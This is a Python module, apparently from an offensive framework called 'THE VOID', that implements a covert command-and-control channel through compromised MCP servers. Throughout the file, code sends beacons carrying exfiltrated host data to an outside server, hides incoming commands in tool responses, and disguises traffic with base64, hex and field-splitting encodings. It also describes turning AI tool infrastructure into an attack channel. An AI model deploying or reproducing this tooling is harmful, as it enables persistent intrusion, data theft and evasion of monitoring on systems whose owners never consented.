"""THE VOID — MCPC2: Post-exploitation C2 channel through compromised MCP servers.

Once an MCP server is compromised (credentials obtained, auth bypass
confirmed, or server process controlled), it becomes a covert C2 channel.
The agent beacons through MCP tool calls and receives tasks embedded in
tool responses — blending into legitimate MCP traffic.

P2.2a of the VOID-CEP-2026-07 capability enhancement plan.
"""

import base64
import json
import logging
import re
import shlex
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from core.executor import Executor, CommandResult
from core.target import Target
from core.boneyard import Boneyard
from core.warlog import WarLog, LogLevel

logger = logging.getLogger("void.c2.mcp_c2")


# ─── Data structures ────────────────────────────────────────────────────

@dataclass
class ChannelState:
    """State of a single C2 channel."""
    channel_id: str
    target: Target
    endpoint: str
    auth: Dict[str, str]
    tool_name: str
    resource_uri: Optional[str] = None
    encoding: str = "base64"
    status: str = "active"       # active / degraded / failed / closed
    established_at: float = 0.0
    last_beacon: float = 0.0
    beacon_count: int = 0
    task_count: int = 0
    fail_count: int = 0
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class BeaconResult:
    """Result of a beacon check-in."""
    channel_id: str
    beacon_id: str
    timestamp: float
    status: str                  # success / failed / timeout
    payload_sent: Dict[str, Any] = field(default_factory=dict)
    task_received: Optional[Dict[str, Any]] = None
    response_data: Dict[str, Any] = field(default_factory=dict)


@dataclass
class Task:
    """A task received from the C2 channel."""
    task_id: str
    channel_id: str
    command: str
    params: Dict[str, Any] = field(default_factory=dict)
    received_at: float = 0.0
    status: str = "pending"      # pending / running / completed / failed
    result: Optional[Dict[str, Any]] = None


# ─── Encoding schemes ──────────────────────────────────────────────────

ENCODING_SCHEMES = {
    "base64": "Standard base64 in a string field",
    "hex": "Hex-encoded in numeric-looking field",
    "field_stego": "Data split across multiple legitimate fields",
    "resource_embed": "Data stored in/retrieved from MCP resource URIs",
    "sse_event": "Custom SSE event types carry C2 data",
}

# ─── Beacon payload keys ───────────────────────────────────────────────

BEACON_TEMPLATE = {
    "b": "",          # base64-encoded beacon data
    "hostname": "",
    "user": "",
    "pid": 0,
    "interval": 30,
}

TASK_MARKER = "_task"   # Hidden field in tool response for task delivery


# ─── Main class ─────────────────────────────────────────────────────────

class MCPC2:
    """Post-exploitation C2 channel through compromised MCP servers.

    Establishes covert C2 channels via MCP tool calls, sending beacons
    and receiving tasks embedded in tool responses.  Supports multiple
    simultaneous channels with automatic failover.
    """

    def __init__(
        self,
        executor: Optional[Executor] = None,
        boneyard: Optional[Boneyard] = None,
        warlog: Optional[WarLog] = None,
    ):
        self.executor = executor if executor is not None else Executor()
        self.boneyard = boneyard if boneyard is not None else Boneyard()
        self.warlog = warlog if warlog is not None else WarLog()

        # Channel management
        self.channels: Dict[str, ChannelState] = {}
        self.active_beacons: Dict[str, Dict] = {}  # beacon_id → state
        self.tasks: Dict[str, Task] = {}            # task_id → Task
        self._request_id: int = 0

        logger.info("MCPC2 module initialized")

    # ─── Public API ────────────────────────────────────────────────────

    def establish_channel(
        self,
        target: Target,
        auth: Dict[str, str],
        tool_name: str = "search",
        resource_uri: Optional[str] = None,
        encoding: str = "base64",
        endpoint: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Establish a C2 channel through a compromised MCP server.

        Args:
            target: The target with the compromised MCP server.
            auth: Auth credentials (token, api_key, etc.).
            tool_name: Tool name to use for beacon/task delivery.
            resource_uri: Optional resource URI for data storage.
            encoding: Encoding scheme (base64, hex, field_stego, resource_embed, sse_event).
            endpoint: Optional explicit endpoint URL (if not derived from target).

        Returns:
            Dict with channel_id, status, and channel config.
        """
        channel_id = f"mcp_c2_{uuid.uuid4().hex[:12]}"
        if endpoint is None:
            endpoint = self._resolve_url(target)

        channel = ChannelState(
            channel_id=channel_id,
            target=target,
            endpoint=endpoint,
            auth=auth,
            tool_name=tool_name,
            resource_uri=resource_uri,
            encoding=encoding,
            established_at=time.time(),
        )
        self.channels[channel_id] = channel

        # Verify channel by sending an initial beacon
        verify_result = self._verify_channel(channel)
        if not verify_result["ok"]:
            channel.status = "failed"
            self.warlog.log(
                f"C2 channel {channel_id} establishment failed: {verify_result['reason']}",
                level=LogLevel.C2,
                module="mcp_c2",
                target=target.name,
                data=verify_result,
            )
            return {
                "channel_id": channel_id,
                "status": "failed",
                "reason": verify_result["reason"],
            }

        channel.status = "active"
        self.warlog.log(
            f"C2 channel {channel_id} established via {endpoint}",
            level=LogLevel.C2,
            module="mcp_c2",
            target=target.name,
            data={"channel_id": channel_id, "tool_name": tool_name, "encoding": encoding},
        )

        # Store in boneyard
        self.boneyard.store(
            category="mcp_c2_channel",
            data={"channel_id": channel_id, "endpoint": endpoint, "tool_name": tool_name},
            tags=["mcp", "c2", "channel"],
        )

        return {
            "channel_id": channel_id,
            "status": "active",
            "endpoint": endpoint,
            "tool_name": tool_name,
            "encoding": encoding,
        }

    def beacon(
        self, channel_id: str, beacon_data: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """Send a beacon check-in with optional data exfil through an MCP channel.

        The beacon is encoded in a tool call parameter and the response
        may contain an embedded task.

        Args:
            channel_id: The channel to send the beacon on.
            beacon_data: Optional data to include in the beacon.

        Returns:
            Dict with beacon result (status, beacon_id, task_received, etc.).
        """
        if channel_id not in self.channels:
            return {"status": "error", "reason": f"Unknown channel: {channel_id}"}

        channel = self.channels[channel_id]
        if channel.status not in ("active", "degraded"):
            return {"status": "error", "reason": f"Channel {channel_id} not active (status={channel.status})"}

        beacon_id = f"beacon_{uuid.uuid4().hex[:8]}"
        timestamp = time.time()

        # Build beacon payload
        payload = self._build_beacon_payload(beacon_data or {})
        encoded_payload = self._encode(payload, channel.encoding)

        # Send beacon via tool call
        tool_args = self._build_tool_args(channel, encoded_payload)
        resp = self._json_rpc_call(
            channel.endpoint, "tools/call",
            {"name": channel.tool_name, "arguments": tool_args},
            auth=channel.auth,
        )

        # Parse response
        task_received = None
        response_data = {}

        if resp and "result" in resp:
            result = resp["result"]
            response_data = result

            # Check for embedded task
            task_received = self._extract_task(result, channel)

        elif resp and "error" in resp:
            channel.fail_count += 1
            if channel.fail_count >= 3 and channel.status == "active":
                channel.status = "degraded"
                logger.warning(f"Channel {channel_id} degraded after {channel.fail_count} failures")

        # Update channel state
        channel.last_beacon = timestamp
        channel.beacon_count += 1
        if task_received:
            channel.task_count += 1

        result = BeaconResult(
            channel_id=channel_id,
            beacon_id=beacon_id,
            timestamp=timestamp,
            status="success" if resp and "result" in resp else "failed",
            payload_sent=payload,
            task_received=task_received,
            response_data=response_data,
        )

        # Store in active beacons
        self.active_beacons[beacon_id] = {
            "channel_id": channel_id,
            "timestamp": timestamp,
            "status": result.status,
        }

        # Log
        self.warlog.log(
            f"Beacon {beacon_id} on {channel_id}: {result.status}",
            level=LogLevel.C2,
            module="mcp_c2",
            target=channel.target.name,
            data={
                "beacon_id": beacon_id,
                "channel_id": channel_id,
                "status": result.status,
                "task_received": task_received is not None,
            },
        )

        return {
            "beacon_id": beacon_id,
            "channel_id": channel_id,
            "status": result.status,
            "task_received": task_received,
            "response_data": response_data,
        }

    def receive_task(self, channel_id: str) -> Optional[Dict[str, Any]]:
        """Poll for tasked commands embedded in MCP responses.

        Sends a lightweight beacon (no data) and checks for a task
        in the response.

        Args:
            channel_id: The channel to poll on.

        Returns:
            Task dict if a task was received, or None.
        """
        beacon_result = self.beacon(channel_id, beacon_data={"type": "poll"})
        if not beacon_result or beacon_result.get("status") != "success":
            return None

        task = beacon_result.get("task_received")
        if task is None:
            return None

        # Register the task
        task_id = task.get("task_id", f"task_{uuid.uuid4().hex[:8]}")
        task_obj = Task(
            task_id=task_id,
            channel_id=channel_id,
            command=task.get("command", ""),
            params=task.get("params", {}),
            received_at=time.time(),
        )
        self.tasks[task_id] = task_obj

        self.warlog.log(
            f"Task received: {task_id} on {channel_id}",
            level=LogLevel.C2,
            module="mcp_c2",
            target=self.channels[channel_id].target.name,
            data={"task_id": task_id, "command": task_obj.command},
        )

        return {
            "task_id": task_id,
            "command": task_obj.command,
            "params": task_obj.params,
        }

    def send_result(
        self, channel_id: str, task_id: str, result: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Return task results through the MCP channel.

        Args:
            channel_id: The channel to send results on.
            task_id: The task ID this result belongs to.
            result: The result data.

        Returns:
            Dict with send status.
        """
        if channel_id not in self.channels:
            return {"status": "error", "reason": f"Unknown channel: {channel_id}"}
        if task_id not in self.tasks:
            return {"status": "error", "reason": f"Unknown task: {task_id}"}

        task = self.tasks[task_id]
        task.status = "completed"
        task.result = result

        channel = self.channels[channel_id]
        encoded_result = self._encode(result, channel.encoding)

        tool_args = self._build_tool_args(channel, encoded_result, is_result=True, task_id=task_id)
        resp = self._json_rpc_call(
            channel.endpoint, "tools/call",
            {"name": channel.tool_name, "arguments": tool_args},
            auth=channel.auth,
        )

        status = "success" if resp and "result" in resp else "failed"

        self.warlog.log(
            f"Task result {task_id} sent: {status}",
            level=LogLevel.C2,
            module="mcp_c2",
            target=channel.target.name,
            data={"task_id": task_id, "status": status},
        )

        return {"task_id": task_id, "status": status}

    def get_channel_status(self, channel_id: str) -> Dict[str, Any]:
        """Get status of a specific channel."""
        if channel_id not in self.channels:
            return {"status": "error", "reason": f"Unknown channel: {channel_id}"}
        ch = self.channels[channel_id]
        return {
            "channel_id": channel_id,
            "status": ch.status,
            "endpoint": ch.endpoint,
            "beacon_count": ch.beacon_count,
            "task_count": ch.task_count,
            "fail_count": ch.fail_count,
            "established_at": ch.established_at,
            "last_beacon": ch.last_beacon,
        }

    def list_channels(self) -> List[Dict[str, Any]]:
        """List all channels and their status."""
        return [self.get_channel_status(cid) for cid in self.channels]

    def close_channel(self, channel_id: str) -> Dict[str, Any]:
        """Close a C2 channel."""
        if channel_id not in self.channels:
            return {"status": "error", "reason": f"Unknown channel: {channel_id}"}
        self.channels[channel_id].status = "closed"
        self.warlog.log(
            f"C2 channel {channel_id} closed",
            level=LogLevel.C2,
            module="mcp_c2",
            target=self.channels[channel_id].target.name,
        )
        return {"channel_id": channel_id, "status": "closed"}

    def get_tasks(self, status: Optional[str] = None) -> List[Dict[str, Any]]:
        """List tasks, optionally filtered by status."""
        tasks = []
        for task in self.tasks.values():
            if status and task.status != status:
                continue
            tasks.append({
                "task_id": task.task_id,
                "channel_id": task.channel_id,
                "command": task.command,
                "params": task.params,
                "status": task.status,
                "result": task.result,
                "received_at": task.received_at,
            })
        return tasks

    # ─── Channel Verification ──────────────────────────────────────────

    def _verify_channel(self, channel: ChannelState) -> Dict[str, Any]:
        """Verify a channel by sending a lightweight probe."""
        try:
            resp = self._json_rpc_call(
                channel.endpoint, "tools/call",
                {"name": channel.tool_name, "arguments": {"query": "__VOID_VERIFY__"}},
                auth=channel.auth,
            )
            if resp and "result" in resp:
                return {"ok": True, "result": resp["result"]}
            if resp and "error" in resp:
                return {"ok": False, "reason": str(resp["error"])}
            return {"ok": False, "reason": "No response"}
        except Exception as e:
            return {"ok": False, "reason": str(e)}

    # ─── Beacon Encoding ───────────────────────────────────────────────

    def _build_beacon_payload(self, beacon_data: Dict[str, Any]) -> Dict[str, Any]:
        """Build a beacon payload with standard fields."""
        payload = {
            "b": "",
            "hostname": beacon_data.get("hostname", ""),
            "user": beacon_data.get("user", ""),
            "pid": beacon_data.get("pid", 0),
            "interval": beacon_data.get("interval", 30),
        }
        # Encode the beacon data (the exfil payload)
        exfil_data = beacon_data.get("exfil", {})
        if exfil_data:
            payload["b"] = base64.b64encode(
                json.dumps(exfil_data).encode()
            ).decode()
        return payload

    def _encode(self, data: Any, scheme: str) -> str:
        """Encode data using the specified encoding scheme."""
        json_str = json.dumps(data)
        if scheme == "base64":
            return base64.b64encode(json_str.encode()).decode()
        elif scheme == "hex":
            return json_str.encode().hex()
        elif scheme == "field_stego":
            # Split data across multiple fields
            chunks = [json_str[i:i+64] for i in range(0, len(json_str), 64)]
            return json.dumps(chunks)
        elif scheme == "resource_embed":
            return json_str  # Store directly in resource
        elif scheme == "sse_event":
            return base64.b64encode(json_str.encode()).decode()
        else:
            return base64.b64encode(json_str.encode()).decode()

    def _decode(self, data: str, scheme: str) -> Any:
        """Decode data from the specified encoding scheme."""
        try:
            if scheme == "base64":
                return json.loads(base64.b64decode(data).decode())
            elif scheme == "hex":
                return json.loads(bytes.fromhex(data).decode())
            elif scheme == "field_stego":
                chunks = json.loads(data)
                return json.loads("".join(chunks))
            elif scheme == "resource_embed":
                return json.loads(data)
            elif scheme == "sse_event":
                return json.loads(base64.b64decode(data).decode())
            else:
                return json.loads(base64.b64decode(data).decode())
        except Exception:
            return None

    def _build_tool_args(
        self,
        tool_name_or_channel,
        data,
        is_result: bool = False,
        task_id: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Build tool arguments for beacon/result delivery.

        Accepts either (ChannelState, encoded_str) or (tool_name_str, payload_dict).
        """
        if isinstance(tool_name_or_channel, ChannelState):
            channel = tool_name_or_channel
            encoded_data = data
            if is_result:
                args = {"query": encoded_data, "result": encoded_data}
                if task_id:
                    args["_task_id"] = task_id
            else:
                args = {"query": encoded_data, "b": encoded_data}
                if channel.resource_uri:
                    args["_resource"] = channel.resource_uri
        else:
            # Called as (tool_name: str, payload: dict)
            tool_name = str(tool_name_or_channel)
            payload = data if isinstance(data, dict) else {"payload": data}
            args = {"name": tool_name, **payload}
        return args

    # ─── Task Extraction ───────────────────────────────────────────────

    def _extract_task(
        self, result: Dict[str, Any], channel: ChannelState = None
    ) -> Optional[Dict[str, Any]]:
        """Extract an embedded task from a tool response."""
        if not isinstance(result, dict):
            return None

        # Check for _task field
        task_data = result.get(TASK_MARKER)
        if task_data:
            decoded = self._decode(task_data, channel.encoding)
            if decoded and isinstance(decoded, dict):
                return {
                    "task_id": decoded.get("task_id", f"task_{uuid.uuid4().hex[:8]}"),
                    "command": decoded.get("command", ""),
                    "params": decoded.get("params", {}),
                }

        # Check for tasks in results list
        results = result.get("results", [])
        if isinstance(results, list):
            for item in results:
                if isinstance(item, dict) and "_task" in item:
                    decoded = self._decode(item["_task"], channel.encoding)
                    if decoded and isinstance(decoded, dict):
                        return {
                            "task_id": decoded.get("task_id", f"task_{uuid.uuid4().hex[:8]}"),
                            "command": decoded.get("command", ""),
                            "params": decoded.get("params", {}),
                        }

        # Fallback: check for top-level command key in the dict
        if "command" in result:
            return {
                "task_id": result.get("task_id", f"task_{uuid.uuid4().hex[:8]}"),
                "command": result["command"],
                "params": result.get("params", {}),
            }

        return None

    # ─── JSON-RPC Helpers ──────────────────────────────────────────────

    def _json_rpc_call(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        auth: Optional[Dict[str, str]] = None,
    ) -> Optional[Dict[str, Any]]:
        """Make a JSON-RPC 2.0 call to the MCP server via curl."""
        self._request_id += 1
        payload = {
            "jsonrpc": "2.0",
            "id": self._request_id,
            "method": method,
            "params": params,
        }
        payload_json = json.dumps(payload)

        # Use temp file to avoid shell quoting issues — write via Python
        # (avoids shell=True for the write operation)
        tmp_file = f"/tmp/mcp_c2_rpc_{self._request_id}.json"
        try:
            with open(tmp_file, "w") as f:
                f.write(payload_json)
        except OSError as e:
            logger.warning(f"Failed to write temp file: {e}")
            return None

        try:
            # Build curl command with optional auth headers (list-form, shell=False)
            curl_args = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json"]
            if auth:
                for key, value in auth.items():
                    curl_args.extend(["-H", f"{key}: {value}"])
            curl_args.extend(["-d", f"@{tmp_file}", url])

            result = self.executor.run(curl_args, timeout=15, shell=False)
            if not result.success or not result.stdout.strip():
                return None

            try:
                resp = json.loads(result.stdout.strip())
                return resp
            except json.JSONDecodeError as e:
                logger.debug(f"JSON-RPC response parse error: {e}")
                return None
        finally:
            self.executor.run(["rm", "-f", tmp_file], timeout=5, shell=False)

    def _resolve_url(self, target: Target) -> str:
        """Resolve target to a base URL."""
        if target.is_url():
            url = target.value
            if not url.startswith("http"):
                url = f"http://{url}"
            return url

        # Extract port from name if present (e.g., "10.0.0.1:9090")
        port = None
        if target.name and ":" in target.name:
            parts = target.name.split(":")
            if len(parts) == 2 and parts[1].isdigit():
                port = parts[1]

        ip = target.get_ip()
        if ip:
            return f"http://{ip}:{port}" if port else f"http://{ip}:3000"
        domain = target.get_domain()
        if domain:
            return f"http://{domain}:{port}" if port else f"http://{domain}:3000"
        return f"http://{target.value}:{port}" if port else f"http://{target.value}:3000"

    # ─── Channel Health ────────────────────────────────────────────────

    def check_channel_health(self, channel_id: str) -> Dict[str, Any]:
        """Check health of a channel by sending a beacon."""
        if channel_id not in self.channels:
            return {"healthy": False, "reason": "Unknown channel"}

        channel = self.channels[channel_id]
        beacon_result = self.beacon(channel_id)

        healthy = beacon_result.get("status") == "success"
        if not healthy and channel.status == "active":
            channel.fail_count += 1
            if channel.fail_count >= 3:
                channel.status = "degraded"
        elif healthy and channel.status == "degraded":
            channel.status = "active"
            channel.fail_count = 0

        return {
            "healthy": healthy,
            "channel_id": channel_id,
            "status": channel.status,
            "fail_count": channel.fail_count,
        }

    def rotate_channels(self) -> Dict[str, Any]:
        """Rotate degraded channels to healthy ones."""
        rotated = []
        for cid, channel in self.channels.items():
            if channel.status == "degraded":
                health = self.check_channel_health(cid)
                if health["status"] == "active":
                    rotated.append(cid)
        return {"rotated": rotated}

    # ─── Convenience ───────────────────────────────────────────────────

    def get_active_channel_count(self) -> int:
        """Count active channels."""
        return sum(1 for ch in self.channels.values() if ch.status == "active")

    def get_total_beacons(self) -> int:
        """Count total beacons sent across all channels."""
        return sum(ch.beacon_count for ch in self.channels.values())

    def get_total_tasks(self) -> int:
        """Count total tasks received across all channels."""
        return sum(ch.task_count for ch in self.channels.values())
